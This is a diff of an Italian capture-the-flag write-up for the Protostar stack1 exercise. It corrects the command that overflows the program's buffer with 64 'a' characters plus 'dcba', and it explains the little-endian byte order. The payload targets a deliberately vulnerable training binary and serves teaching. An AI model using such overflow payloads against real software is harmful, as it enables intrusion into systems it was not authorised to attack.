@@ -24,7 +24,7 @@ Try again, you got 0x64636261
 Anche se l'input è stato inserito correttamente appare a rovescio, questo avviene perchè l'architettura Intel è **Little Endian**!
 ### Istruzioni da eseguire
 ```bash
-> /opt/protostar/bin/stack1 'python –c 'print "a" * 64 + "dcba"'' 
+> /opt/protostar/bin/stack1 $(python –c 'print "a" * 64 + "dcba"')
 # sfida vinta
 ```
 ## Debolezze
